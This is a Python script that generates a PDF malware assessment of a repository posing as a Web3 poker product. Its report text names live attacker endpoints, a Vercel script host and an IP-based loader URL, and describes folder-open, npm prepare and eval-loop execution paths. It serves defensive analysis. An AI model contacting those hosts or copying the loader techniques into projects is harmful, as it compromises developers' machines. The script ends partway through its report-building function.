"""Static-assessment report for the zyranova-main tree.

Generates seaborn figures and a multi-page PDF. Does not execute project
code, install dependencies, or contact remote hosts.
"""

from __future__ import annotations

import os
from pathlib import Path

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt
import pandas as pd
import seaborn as sns
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER, TA_JUSTIFY, TA_LEFT, TA_RIGHT
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.units import inch
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.platypus import (
    CondPageBreak,
    Flowable,
    Image,
    KeepTogether,
    ListFlowable,
    ListItem,
    PageBreak,
    Paragraph,
    Preformatted,
    SimpleDocTemplate,
    Spacer,
    Table,
    TableStyle,
)

ROOT = Path(r"c:\Users\yalon\Downloads\zyranova-main")
ASSET = ROOT / "report_assets"
PDF_PATH = ROOT / "Zyranova_Malware_Assessment_Report.pdf"

NAVY = colors.HexColor("#1B2A4A")
CRIMSON = colors.HexColor("#8C1D2C")
GOLD = colors.HexColor("#8A6A2F")
SLATE = colors.HexColor("#243040")
MUTED = colors.HexColor("#5C6570")
RULE = colors.HexColor("#E4DDD2")
PAPER = colors.HexColor("#F7F4EF")
CREAM = colors.HexColor("#FBF8F3")
ROW = colors.HexColor("#F4F0E8")
WHITE = colors.white

SEV_HEX = {
    "Critical": "#8C1D2C",
    "High": "#C4652D",
    "Medium": "#C4A15A",
    "Low": "#3E6B73",
}


def register_fonts() -> dict[str, str]:
    files = {
        "Calibri": r"C:\Windows\Fonts\calibri.ttf",
        "Calibri-Bold": r"C:\Windows\Fonts\calibrib.ttf",
        "Calibri-Italic": r"C:\Windows\Fonts\calibrii.ttf",
        "Calibri-BoldItalic": r"C:\Windows\Fonts\calibriz.ttf",
        "Consolas": r"C:\Windows\Fonts\consola.ttf",
        "Consolas-Bold": r"C:\Windows\Fonts\consolab.ttf",
    }
    ready = {}
    for name, path in files.items():
        if os.path.exists(path):
            pdfmetrics.registerFont(TTFont(name, path))
            ready[name] = name
    pdfmetrics.registerFontFamily(
        "Calibri",
        normal="Calibri",
        bold="Calibri-Bold",
        italic="Calibri-Italic",
        boldItalic="Calibri-BoldItalic",
    )
    return ready


FONTS = register_fonts()
SANS = "Calibri"
SANS_B = "Calibri-Bold"
SANS_I = "Calibri-Italic"
MONO = "Consolas"


def styles() -> dict[str, ParagraphStyle]:
    s = {}
    s["h1"] = ParagraphStyle(
        "h1",
        fontName=SANS_B,
        fontSize=16.5,
        leading=20,
        textColor=NAVY,
        spaceBefore=2,
        spaceAfter=8,
    )
    s["h2"] = ParagraphStyle(
        "h2",
        fontName=SANS_B,
        fontSize=12.5,
        leading=16,
        textColor=CRIMSON,
        spaceBefore=11,
        spaceAfter=4,
    )
    s["h3"] = ParagraphStyle(
        "h3",
        fontName=SANS_B,
        fontSize=11,
        leading=14,
        textColor=NAVY,
        spaceBefore=8,
        spaceAfter=3,
    )
    s["body"] = ParagraphStyle(
        "body",
        fontName=SANS,
        fontSize=10.5,
        leading=14.6,
        textColor=SLATE,
        alignment=TA_JUSTIFY,
        spaceAfter=8,
    )
    s["body_left"] = ParagraphStyle(
        "body_left",
        parent=s["body"],
        alignment=TA_LEFT,
    )
    s["bullet"] = ParagraphStyle(
        "bullet",
        fontName=SANS,
        fontSize=10.5,
        leading=14.2,
        textColor=SLATE,
        leftIndent=16,
        firstLineIndent=-12,
        spaceAfter=3,
    )
    s["caption"] = ParagraphStyle(
        "caption",
        fontName=SANS_I,
        fontSize=8.4,
        leading=11,
        textColor=MUTED,
        spaceBefore=2,
        spaceAfter=8,
    )
    s["callout"] = ParagraphStyle(
        "callout",
        fontName=SANS,
        fontSize=10,
        leading=13.6,
        textColor=NAVY,
        alignment=TA_LEFT,
    )
    s["th"] = ParagraphStyle(
        "th",
        fontName=SANS_B,
        fontSize=8.2,
        leading=10.5,
        textColor=WHITE,
    )
    s["td"] = ParagraphStyle(
        "td",
        fontName=SANS,
        fontSize=8.2,
        leading=10.8,
        textColor=SLATE,
    )
    s["td_b"] = ParagraphStyle(
        "td_b",
        fontName=SANS_B,
        fontSize=8.2,
        leading=10.8,
        textColor=NAVY,
    )
    s["footer"] = ParagraphStyle(
        "footer",
        fontName=SANS,
        fontSize=8,
        textColor=MUTED,
    )
    s["toc"] = ParagraphStyle(
        "toc",
        fontName=SANS,
        fontSize=11,
        leading=18,
        textColor=SLATE,
        leftIndent=6,
    )
    s["small"] = ParagraphStyle(
        "small",
        fontName=SANS,
        fontSize=9,
        leading=12.2,
        textColor=SLATE,
        alignment=TA_LEFT,
        spaceAfter=4,
    )
    return s


ST = styles()


def P(text: str, style: str = "body") -> Paragraph:
    return Paragraph(text, ST[style])


def bullet(text: str) -> Paragraph:
    return Paragraph("•  " + text, ST["bullet"])


def caption(text: str) -> Paragraph:
    return Paragraph(text, ST["caption"])


def fig(path: Path, width: float = 7.15 * inch) -> Image:
    img = Image(str(path))
    aspect = img.imageHeight / float(img.imageWidth)
    img.drawWidth = width
    img.drawHeight = width * aspect
    img.hAlign = "CENTER"
    return img


class Bookmark(Flowable):
    def __init__(self, key: str, title: str, level: int = 0):
        super().__init__()
        self.key = key
        self.title = title
        self.level = level
        self.width = 0
        self.height = 0

    def draw(self):
        self.canv.bookmarkPage(self.key)
        self.canv.addOutlineEntry(self.title, self.key, level=self.level, closed=False)


class ColoredRule(Flowable):
    def __init__(self, color=CRIMSON, thickness=1.5, space_before=0, space_after=8):
        super().__init__()
        self.color = color
        self.thickness = thickness
        self.space_before = space_before
        self.space_after = space_after
        self.height = thickness + space_before + space_after
        self.width = 0

    def wrap(self, aw, ah):
        self.width = aw
        return aw, self.height

    def draw(self):
        self.canv.setStrokeColor(self.color)
        self.canv.setLineWidth(self.thickness)
        y = self.space_after
        self.canv.line(0, y + self.thickness, self.width, y + self.thickness)


def callout(text: str, fill=PAPER, border=CRIMSON) -> Table:
    inner = Paragraph(text, ST["callout"])
    table = Table([[inner]], colWidths=[7.15 * inch])
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, -1), fill),
                ("BOX", (0, 0), (-1, -1), 0.4, border),
                ("LEFTPADDING", (0, 0), (-1, -1), 10),
                ("RIGHTPADDING", (0, 0), (-1, -1), 10),
                ("TOPPADDING", (0, 0), (-1, -1), 8),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
                ("LINEBEFORE", (0, 0), (0, 0), 4, border),
            ]
        )
    )
    return table


def section(key: str, title: str) -> list:
    return [CondPageBreak(190), Bookmark(key, title), P(title, "h1"), ColoredRule()]


def finding(title: str) -> list:
    return [CondPageBreak(150), P(title, "h2")]


def data_table(headers: list[str], rows: list[list[str]], col_widths: list[float]) -> Table:
    head = [Paragraph(h, ST["th"]) for h in headers]
    body = []
    for row in rows:
        body.append(
            [
                Paragraph(cell, ST["td_b"] if i == 0 else ST["td"])
                for i, cell in enumerate(row)
            ]
        )
    table = Table([head] + body, colWidths=col_widths, repeatRows=1)
    style_cmds = [
        ("BACKGROUND", (0, 0), (-1, 0), NAVY),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("FONTNAME", (0, 0), (-1, 0), SANS_B),
        ("BACKGROUND", (0, 1), (-1, -1), CREAM),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("LEFTPADDING", (0, 0), (-1, -1), 5),
        ("RIGHTPADDING", (0, 0), (-1, -1), 5),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("GRID", (0, 0), (-1, -1), 0.3, RULE),
        ("ALIGN", (0, 0), (-1, 0), "LEFT"),
    ]
    for i in range(1, len(body) + 1):
        if i % 2 == 0:
            style_cmds.append(("BACKGROUND", (0, i), (-1, i), ROW))
    table.setStyle(TableStyle(style_cmds))
    return table


def apply_chart_style(ax, title: str, xlabel: str | None = None, ylabel: str | None = None):
    ax.set_title(title, loc="left", pad=12, color="#1B2A4A", fontsize=13, fontweight="semibold")
    if xlabel:
        ax.set_xlabel(xlabel, color="#243040")
    else:
        ax.set_xlabel("")
    if ylabel:
        ax.set_ylabel(ylabel, color="#243040")
    else:
        ax.set_ylabel("")
    ax.tick_params(colors="#243040")
    for spine in ("top", "right"):
        ax.spines[spine].set_visible(False)
    for spine in ("left", "bottom"):
        ax.spines[spine].set_color("#D9D3CB")
    ax.grid(axis="x", color="#E6E1D8", linewidth=0.8)
    ax.set_axisbelow(True)


def save_fig(fig_obj, name: str) -> Path:
    path = ASSET / name
    fig_obj.savefig(path, dpi=170, bbox_inches="tight", facecolor="white")
    plt.close(fig_obj)
    return path


def build_charts() -> dict[str, Path]:
    sns.set_theme(style="whitegrid", context="notebook")
    plt.rcParams.update(
        {
            "font.family": "DejaVu Sans",
            "axes.titlesize": 13,
            "axes.labelsize": 10,
            "xtick.labelsize": 9,
            "ytick.labelsize": 9,
            "figure.facecolor": "white",
            "axes.facecolor": "white",
            "grid.color": "#E6E1D8",
        }
    )
    paths = {}

    severity = pd.DataFrame(
        {
            "Severity": ["Critical", "High", "Medium", "Low"],
            "Findings": [3, 4, 3, 1],
        }
    )
    fig1, ax = plt.subplots(figsize=(9.4, 4.3))
    sns.barplot(
        data=severity,
        x="Severity",
        y="Findings",
        hue="Severity",
        palette=SEV_HEX,
        dodge=False,
        legend=False,
        ax=ax,
        order=["Critical", "High", "Medium", "Low"],
    )
    for container in ax.containers:
        ax.bar_label(container, padding=3, fontsize=10, color="#1B2A4A", fontweight="medium")
    apply_chart_style(ax, "Findings by severity", xlabel="Severity", ylabel="Number of findings")
    ax.set_ylim(0, 5.2)
    ax.grid(axis="y", color="#E6E1D8", linewidth=0.8)
    ax.grid(axis="x", visible=False)
    fig1.tight_layout()
    paths["severity"] = save_fig(fig1, "01_severity.png")

    categories = pd.DataFrame(
        {
            "Category": [
                "Malware execution",
                "Authentication",
                "Social-engineering lure",
                "Game integrity",
                "Secrets and configuration",
                "Platform hardening",
                "Content relay",
                "Reliability",
            ],
            "Findings": [3, 2, 1, 1, 1, 1, 1, 1],
        }
    ).sort_values("Findings", ascending=False)
    fig2, ax = plt.subplots(figsize=(9.4, 5.1))
    sns.barplot(
        data=categories,
        y="Category",
        x="Findings",
        hue="Category",
        dodge=False,
        legend=False,
        palette=["#8C1D2C", "#C4652D", "#8A6A2F", "#1B2A4A", "#3E6B73", "#6E5A7D", "#8D6E63", "#90A4AE"],
        ax=ax,
    )
    for container in ax.containers:
        ax.bar_label(container, padding=3, fontsize=9, color="#1B2A4A")
    apply_chart_style(ax, "Findings by category", xlabel="Number of findings")
    ax.set_xlim(0, 4.2)
    fig2.tight_layout()
    paths["category"] = save_fig(fig2, "02_category.png")

    scores = pd.DataFrame(
        {
            "Finding": [
                "F-01  Folder-open shell task",
                "F-02  Hidden loader in auth.js",
                "F-03  npm prepare launches server",
                "F-11  Product description is a lure",
                "F-04  Login skips the password",
                "F-05  Socket identity is client-supplied",
                "F-06  Chip accounting trusts the client",
                "F-07  JWT settings and token logging",
                "F-08  Open CORS, helmet disabled",
                "F-09  Chat relayed without checks",
                "F-10  Database never connected",
            ],
            "Risk contribution": [10, 10, 9.6, 8.2, 8.0, 7.4, 7.0, 5.4, 4.6, 4.4, 3.0],
            "Severity": [
                "Critical",
                "Critical",
                "Critical",
                "High",
                "High",
                "High",
                "High",
                "Medium",
                "Medium",
                "Medium",
                "Low",
            ],
        }
    )
    fig3, ax = plt.subplots(figsize=(9.4, 6.2))
    sns.barplot(
        data=scores,
        y="Finding",
        x="Risk contribution",
        hue="Severity",
        dodge=False,
        palette=SEV_HEX,
        ax=ax,
    )
    ax.legend(title="Severity", frameon=False, loc="lower right")
    apply_chart_style(
        ax,
        "Relative risk contribution of each finding",
        xlabel="Analyst score, 0 to 10",
    )
    ax.set_xlim(0, 11.4)
    fig3.tight_layout()
    paths["scores"] = save_fig(fig3, "03_risk_scores.png")

    heat = pd.DataFrame(
        [
            [5, 5, 2, 5, 5],
            [5, 5, 2, 5, 4],
            [5, 4, 1, 4, 5],
            [1, 4, 3, 2, 3],
            [1, 3, 5, 2, 4],
            [0, 1, 5, 1, 3],
            [1, 4, 2, 2, 2],
            [0, 3, 0, 5, 5],
        ],
        index=[
            "tasks.json shell task",
            "auth.js loader",
            "package.json prepare",
            "Login controller",
            "Socket layer",
            "Chip and raise logic",
            "JWT and env config",
            "README lure",
        ],
        columns=[
            "Code\nexecution",
            "Secrets or\nwallets",
            "Data\nintegrity",
            "Stealth",
            "Ease of\ntrigger",
        ],
    )
    fig4, ax = plt.subplots(figsize=(9.6, 5.8))
    sns.heatmap(
        heat,
        ax=ax,
        cmap=sns.color_palette("Reds", as_cmap=True),
        annot=False,
        linewidths=1.2,
        linecolor="white",
        vmin=0,
        vmax=5,
        cbar_kws={"label": "Severity of exposure (0 none, 5 severe)", "shrink": 0.85},
    )
    for i in range(heat.shape[0]):
        for j in range(heat.shape[1]):
            val = int(heat.iloc[i, j])
            ax.text(
                j + 0.5,
                i + 0.5,
                str(val),
                ha="center",
                va="center",
                color="white" if val >= 4 else "#1B2A4A",
                fontsize=9,
                fontweight="medium",
            )
    ax.set_title(
        "Exposure heatmap by component",
        loc="left",
        pad=12,
        color="#1B2A4A",
        fontsize=13,
        fontweight="semibold",
    )
    ax.set_xlabel("")
    ax.set_ylabel("")
    ax.tick_params(axis="x", labelrotation=0, labelsize=8.5)
    ax.tick_params(axis="y", labelrotation=0, labelsize=8.5)
    fig4.tight_layout()
    paths["heatmap"] = save_fig(fig4, "04_heatmap.png")

    stack = pd.DataFrame(
        {
            "Technology": [
                "React UI",
                "Express API",
                "Socket.IO",
                "Ethers.js dependency",
                "Poker game logic",
                "MongoDB model only",
                "Next.js",
                "Three.js / Babylon",
                "Tailwind CSS",
                "Solidity / Hardhat",
                "Polygon contracts",
                "PostgreSQL",
                "Redis",
                "Unity / WebGL product",
                "Python analytics",
                "IPFS",
                "TypeScript services",
            ],
            "Status": [
                "Present",
                "Present",
                "Present",
                "Present",
                "Present",
                "Partial",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
                "Absent",
            ],
        }
    )
    status_score = {"Absent": 0.15, "Partial": 0.55, "Present": 1.0}
    stack["Coverage"] = stack["Status"].map(status_score)
    fig5, ax = plt.subplots(figsize=(9.4, 6.6))
    sns.barplot(
        data=stack,
        y="Technology",
        x="Coverage",
        hue="Status",
        dodge=False,
        palette={"Present": "#2F6F4E", "Partial": "#C4A15A", "Absent": "#8C1D2C"},
        hue_order=["Present", "Partial", "Absent"],
        ax=ax,
    )
    ax.legend(title="In this tree", frameon=False, loc="lower right")
    apply_chart_style(ax, "Advertised stack compared with the files on disk")
    ax.set_xlim(0, 1.35)
    ax.set_xticks([0.15, 0.55, 1.0])
    ax.set_xticklabels(["Absent", "Partial", "Present"])
    ax.tick_params(axis="x", pad=4)
    sns.move_legend(ax, "lower right", frameon=False, title="In this tree")
    fig5.tight_layout()
    paths["stack"] = save_fig(fig5, "05_stack_gap.png")

    actions = [
        "Open folder,\nautomatic tasks on",
        "npm install",
        "Start the Node server",
        "Read files only\n(this assessment)",
    ]
    outcomes = [
        "Remote shell\nfrom Vercel",
        "Silent\nnpm install",
        "Node loader\ncontacts C2",
        "Remote JavaScript\nfetched and eval'd",
    ]
    matrix = pd.DataFrame(
        [
            [1, 1, 1, 1],
            [0, 1, 1, 1],
            [0, 0, 1, 1],
            [0, 0, 0, 0],
        ],
        index=actions,
        columns=outcomes,
    )
    fig6, ax = plt.subplots(figsize=(9.6, 4.8))
    sns.heatmap(
        matrix,
        ax=ax,
        cmap=sns.color_palette(["#E7F2EC", "#8C1D2C"], as_cmap=True),
        annot=False,
        linewidths=2,
        linecolor="white",
        vmin=0,
        vmax=1,
        cbar=False,
    )
    for i in range(matrix.shape[0]):
        for j in range(matrix.shape[1]):
            val = int(matrix.iloc[i, j])
            ax.text(
                j + 0.5,
                i + 0.5,
                "Yes" if val else "No",
                ha="center",
                va="center",
                color="white" if val else "#1B2A4A",
                fontsize=10,
                fontweight="medium",
            )
    ax.set_title(
        "Which ordinary actions would start the malware",
        loc="left",
        pad=12,
        color="#1B2A4A",
        fontsize=13,
        fontweight="semibold",
    )
    ax.tick_params(axis="x", labelrotation=0, labelsize=8.5)
    ax.tick_params(axis="y", labelrotation=0, labelsize=8.5)
    ax.set_xlabel("")
    ax.set_ylabel("")
    fig6.tight_layout()
    paths["triggers"] = save_fig(fig6, "06_triggers.png")

    controls = pd.DataFrame(
        {
            "Control": [
                "Password hashing at registration",
                "JWT check on HTTP routes",
                "Rate limit (100 / 10 min)",
                "mongo-sanitize, hpp, xss-clean",
                "Opponent hole cards hidden",
                "Password check at login",
                "Authentication on sockets",
                "Seat ownership on rebuy",
                "Bounds on raise amounts",
                "Helmet security headers",
                "CORS allow-list",
                "Environment file on a real path",
                "MongoDB connected at startup",
            ],
            "State": [
                "Present",
                "Present",
                "Present",
                "Present",
                "Present",
                "Missing",
                "Missing",
                "Missing",
                "Missing",
                "Missing",
                "Missing",
                "Missing",
                "Missing",
            ],
        }
    )
    controls["Value"] = 1
    fig7, ax = plt.subplots(figsize=(9.4, 6.4))
    sns.barplot(
        data=controls,
        y="Control",
        x="Value",
        hue="State",
        dodge=False,
        palette={"Present": "#2F6F4E", "Missing": "#8C1D2C"},
        hue_order=["Present", "Missing"],
        ax=ax,
    )
    apply_chart_style(ax, "Server controls that exist, and the ones removed or never wired")
    ax.set_xlim(0, 1)
    ax.set_xticks([])
    ax.set_xlabel("")
    sns.move_legend(ax, "lower center", bbox_to_anchor=(0.5, -0.08), ncol=2, frameon=False, title=None)
    fig7.tight_layout()
    fig7.subplots_adjust(bottom=0.14)
    paths["controls"] = save_fig(fig7, "07_controls.png")
    return paths


def code_block(text: str) -> Table:
    pre = Preformatted(text, ParagraphStyle(
        "pre",
        fontName=MONO,
        fontSize=8,
        leading=11,
        textColor=NAVY,
    ))
    table = Table([[pre]], colWidths=[7.15 * inch])
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#F4F1EA")),
                ("BOX", (0, 0), (-1, -1), 0.4, RULE),
                ("LEFTPADDING", (0, 0), (-1, -1), 8),
                ("RIGHTPADDING", (0, 0), (-1, -1), 8),
                ("TOPPADDING", (0, 0), (-1, -1), 6),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
            ]
        )
    )
    return table


def draw_cover(canvas, doc):
    canvas.saveState()
    w, h = letter
    canvas.setFillColor(NAVY)
    canvas.rect(0, 0, w, h, fill=1, stroke=0)
    canvas.setFillColor(colors.HexColor("#8C1D2C"))
    canvas.rect(0, 0, 14, h, fill=1, stroke=0)
    canvas.setFillColor(colors.HexColor("#C4A15A"))
    canvas.rect(0, h - 18, w, 18, fill=1, stroke=0)

    canvas.setFillColor(colors.HexColor("#E7D7A1"))
    canvas.setFont(SANS_B, 9.5)
    canvas.drawString(46, h - 58, "CONFIDENTIAL  ·  STATIC MALWARE AND WEAKNESS ASSESSMENT")

    canvas.setFillColor(WHITE)
    canvas.setFont(SANS_B, 32)
    canvas.drawString(46, h - 130, "Zyranova")
    canvas.setFont(SANS, 16)
    canvas.drawString(46, h - 158, "Repository security assessment")

    canvas.setStrokeColor(colors.HexColor("#C4A15A"))
    canvas.setLineWidth(1.2)
    canvas.line(46, h - 178, 280, h - 178)

    canvas.setFillColor(colors.HexColor("#D5DCEA"))
    canvas.setFont(SANS, 11)
    y = h - 210
    lines = [
        "Local tree reviewed: zyranova-main / zyranova-main",
        "Assessment date: 21 November 2026",
        "Method: source review and offline decode of one obfuscated script",
        "Remote hosts were not contacted. Project code was not executed.",
    ]
    for line in lines:
        canvas.drawString(46, y, line)
        y -= 18

    stats = [
        ("3", "Critical loaders"),
        ("11", "Findings recorded"),
        ("0", "Payloads executed"),
    ]
    box_w = 160
    gap = 14
    stat_y = 318
    for i, (num, label) in enumerate(stats):
        x = 46 + i * (box_w + gap)
        canvas.setFillColor(colors.HexColor("#243656"))
        canvas.roundRect(x, stat_y, box_w, 72, 6, fill=1, stroke=0)
        canvas.setFillColor(colors.HexColor("#E7D7A1"))
        canvas.setFont(SANS_B, 22)
        canvas.drawString(x + 16, stat_y + 36, num)
        canvas.setFillColor(WHITE)
        canvas.setFont(SANS, 9)
        canvas.drawString(x + 16, stat_y + 16, label)

    # Result band
    canvas.setFillColor(colors.HexColor("#8C1D2C"))
    canvas.roundRect(46, 168, w - 92, 118, 8, fill=1, stroke=0)
    canvas.setFillColor(WHITE)
    canvas.setFont(SANS_B, 12)
    canvas.drawString(64, 258, "RESULT")
    canvas.setFont(SANS, 11)
    canvas.drawString(64, 236, "The tree is a malicious package dressed as a Web3 product.")
    canvas.drawString(64, 218, "Opening it with automatic tasks, or running npm install, starts a loader.")
    canvas.drawString(64, 200, "A second task downloads a script and pipes it into the system shell.")
    canvas.drawString(64, 182, "Do not install dependencies. Do not allow automatic editor tasks.")

    canvas.setFillColor(colors.HexColor("#9AABCC"))
    canvas.setFont(SANS, 8.5)
    canvas.drawString(46, 48, "Distribution is limited to the person who requested the review of this local copy.")
    canvas.drawString(46, 34, "Indicators in this document are for containment and blocking. They are not an invitation to retrieve the payloads.")
    canvas.restoreState()


def draw_later(canvas, doc):
    canvas.saveState()
    w, h = letter
    canvas.setFillColor(NAVY)
    canvas.rect(0, h - 32, w, 32, fill=1, stroke=0)
    canvas.setFillColor(colors.HexColor("#C4A15A"))
    canvas.rect(0, h - 35, w, 3, fill=1, stroke=0)
    canvas.setFillColor(WHITE)
    canvas.setFont(SANS, 8)
    canvas.drawString(48, h - 20, "Zyranova repository  ·  malware and weakness assessment")
    canvas.setFont(SANS, 8)
    canvas.drawRightString(w - 48, h - 20, "21 November 2026")

    canvas.setFillColor(colors.HexColor("#E4DDD2"))
    canvas.rect(0, 0, w, 32, fill=1, stroke=0)
    canvas.setFillColor(MUTED)
    canvas.setFont(SANS, 8)
    canvas.drawString(48, 14, "Confidential  ·  static review  ·  payloads were not retrieved")
    canvas.setFont(SANS, 8)
    canvas.drawRightString(w - 48, 14, f"Page {doc.page}")
    canvas.restoreState()


def build_story(charts: dict[str, Path]) -> list:
    story: list = []
    story.append(PageBreak())

    story += section("exec", "1.  Executive summary")
    story.append(
        P(
            "The folder presented as <b>Zyranova</b> is a malicious software package built around a small poker application. "
            "The README describes a Polygon metaverse: Solidity contracts, NFTs, a 3D world, PostgreSQL, Redis, and a nine-person engineering team. "
            "The files on disk are a JavaScript poker server and a Create React App client, with three mechanisms whose purpose is to run attacker-controlled code on the machine of whoever opens or installs the project."
        )
    )
    story.append(
        P(
            "Two of those mechanisms sit in <font face='Consolas' size='9'>.vscode/tasks.json</font> and are marked to run when the folder opens. "
            "One silently runs <font face='Consolas' size='9'>npm install</font>. The other downloads an operating-system-specific script from <font face='Consolas' size='9'>api-checking-1.vercel.app</font> and pipes it into <font face='Consolas' size='9'>cmd</font>, <font face='Consolas' size='9'>bash</font>, or <font face='Consolas' size='9'>sh</font>. "
            "The third mechanism is a <font face='Consolas' size='9'>prepare</font> script in the root <font face='Consolas' size='9'>package.json</font>. npm runs <font face='Consolas' size='9'>prepare</font> after install. That script starts <font face='Consolas' size='9'>node server</font> in the background. Starting the server loads <font face='Consolas' size='9'>routes/api/auth.js</font>, which hides a second loader after the legitimate export."
        )
    )
    story.append(
        P(
            "That loader was decoded offline. It silences console output, then repeatedly downloads JavaScript from <font face='Consolas' size='9'>http://88.216.57.122:8080/api/runners/start/javascript</font> and evaluates it. "
            "The program returned by that server is the real second stage. It is not stored in the repository, and this assessment did not download it. Anyone who already allowed the editor tasks, or who already ran <font face='Consolas' size='9'>npm install</font> in this tree, should treat the host as compromised."
        )
    )
    story.append(
        callout(
            "<b>This copy.</b> No <font face='Consolas' size='8'>node_modules</font> directory is present, so the prepare script has not finished an install inside this folder. "
            "That does not speak to other copies, or to a machine where automatic tasks were approved. Editor tasks with <font face='Consolas' size='8'>runOn: folderOpen</font> stay dormant in current Visual Studio Code and Cursor until automatic tasks are allowed. If that prompt was accepted, assume both loaders ran."
        )
    )
    story.append(Spacer(1, 6))
    story.append(
        P(
            "Under the loaders, the poker server contains defects that read as a security take-home: login ignores the password, sockets accept a wallet identity from the client, and chip movements are not authorized. "
            "Those defects are real. They also function as the assignment a recruiting pretext would ask a candidate to audit, which gives the candidate a reason to open the folder and install it. "
            "The wallet page does not contain a browser-wallet drainer. Theft, if it happens, would come from the remote stages, which have a clear path to the filesystem, environment, and any unlocked session on the host."
        )
    )

    story.append(P("What this assessment established", "h2"))
    story.append(bullet("<b>Three critical execution paths</b> are present and intentional: a silent install task, a remote shell task, and a Node loader started by <font face='Consolas' size='9'>prepare</font>."))
    story.append(bullet("<b>The Node loader is a stage-one dropper.</b> It hides its own logs, stamps two environment variables (<font face='Consolas' size='9'>AHA_SERVER</font> and <font face='Consolas' size='9'>AHA_TEAM</font>), and evaluates remote JavaScript in a retry loop."))
    story.append(bullet("<b>The product story does not match the code.</b> Of the technologies named in the README, the tree actually contains a React poker client, an Express server, Socket.IO, and an ethers dependency. Contracts, Next.js, PostgreSQL, Redis, Unity, and the analytics stack are absent."))
    story.append(bullet("<b>Eight further weaknesses</b> sit in authentication, sockets, chip accounting, configuration, and hardening. Several are severe inside the game. None of them are the primary risk. The primary risk is code execution during ordinary setup."))
    story.append(bullet("<b>No sample was executed and no command-and-control host was contacted,</b> so the second-stage behavior is unknown beyond the fact that the loader will run whatever JavaScript that host returns."))

    story += section("scope", "2.  Scope and method")
    story.append(P("In scope", "h2"))
    story.append(
        P(
            "The review covered the nested project at <font face='Consolas' size='9'>zyranova-main/zyranova-main</font>: server entrypoint, routes, controllers, middleware, models, game engine, socket layer, client source, both package manifests, the README, <font face='Consolas' size='9'>.gitignore</font>, and the <font face='Consolas' size='9'>.vscode</font> directory. "
            "The search looked for install hooks, editor tasks, obfuscation, dynamic code execution, wallet-drainer patterns, unexpected network endpoints, and application flaws that would matter if the server were ever run on purpose."
        )
    )
    story.append(P("Method", "h2"))
    story.append(bullet("Inventory of the tree and of both <font face='Consolas' size='9'>package.json</font> manifests, including lifecycle scripts."))
    story.append(bullet("Pattern search for dynamic execution, process spawning, encoded strings, wallet signing, token approvals, and remote URLs."))
    story.append(bullet("Line-by-line reading of the editor tasks, the server bootstrap, the auth route, the auth controller, the socket gateway, chip accounting, and the wallet page."))
    story.append(bullet("Offline reconstruction of the single obfuscated blob in <font face='Consolas' size='9'>routes/api/auth.js</font>. The reconstructed text was read, summarized, and deleted. It was not passed to <font face='Consolas' size='9'>eval</font> or to Node as a program."))
    story.append(bullet("A dependency lockfile was present for the client and the server. It was not installed, and packages were not fetched from the registry."))
    story.append(P("Out of scope, on purpose", "h2"))
    story.append(
        P(
            "The script hosted at <font face='Consolas' size='9'>api-checking-1.vercel.app</font> was not downloaded. The JavaScript hosted at <font face='Consolas' size='9'>88.216.57.122:8080</font> was not downloaded. "
            "Fetching either URL would tell that infrastructure that this copy was being examined, and would place a further malware sample on the analysis machine. "
            "Behavioral claims in this report about those two hosts stop at what the local code would do with the response: pass it to a shell, or pass it to <font face='Consolas' size='9'>eval</font>."
        )
    )
    story.append(P("How to read the charts", "h2"))
    story.append(
        P(
            "Every figure is a summary of this static review. Counts are counts of findings. Heat-map cells and the 0–10 scores are analyst judgments of exposure, using a fixed rubric in the appendix. "
            "They are not telemetry, not a CVSS vector, and not a measurement of a live intrusion."
        )
    )

    story += section("profile", "3.  What the repository claims")
    story.append(
        P(
            "The README is titled Zyranova and badges Node.js 18, React 18, Polygon, Solidity 0.8.20, and an MIT license. "
            "The introduction calls the project a decentralized metaverse with NFT assets, provably fair gameplay, 3D worlds, and soulbound-token identity. "
            "A later section names a team of four frontend developers, two blockchain developers, two backend developers, and a technical manager. "
            "The quick start is three steps: <font face='Consolas' size='9'>npm install</font>, <font face='Consolas' size='9'>npm start</font>, then open <font face='Consolas' size='9'>http://localhost:3000</font>."
        )
    )
    story.append(
        P(
            "That quick start is the social hook. <font face='Consolas' size='9'>npm install</font> is exactly the command that fires the <font face='Consolas' size='9'>prepare</font> script. "
            "A candidate asked to “get the project running and review the security” is walked into the loader by the setup instructions themselves."
        )
    )
    story.append(fig(charts["stack"]))
    story.append(
        caption(
            "Figure 1. Technologies named by the README, scored against the tree. Present means the dependency or feature is actually implemented. "
            "Partial means a fragment exists and is not connected. Absent means the name appears in the marketing text and nowhere in the implementation. "
            "Source: static review, 21 November 2026."
        )
    )
    story.append(P("Where the description and the tree diverge", "h2"))
    story.append(bullet("The client is Create React App with <font face='Consolas' size='9'>react</font> 16.13.1 and <font face='Consolas' size='9'>react-scripts</font> 3.4.3. The badge says React 18. There is no Next.js app, no <font face='Consolas' size='9'>app</font> router, and no Tailwind configuration. Styling is styled-components, Sass, and Bootstrap."))
    story.append(bullet("There are no <font face='Consolas' size='9'>.sol</font> files, no Hardhat or Foundry project, and no deployment scripts. Ethers is a dependency. The only wallet call path requests accounts and a chain switch. It does not sign, approve, or transfer."))
    story.append(bullet("The server is Express plus Socket.IO, in JavaScript. <font face='Consolas' size='9'>config/db.js</font> can connect to MongoDB, and a User model exists. <font face='Consolas' size='9'>server.js</font> never calls the connector. PostgreSQL, Redis, and IPFS are not dependencies."))
    story.append(bullet("There is no Python, no Unity project, no Three.js or Babylon scene, and no LICENSE file to match the MIT badge."))
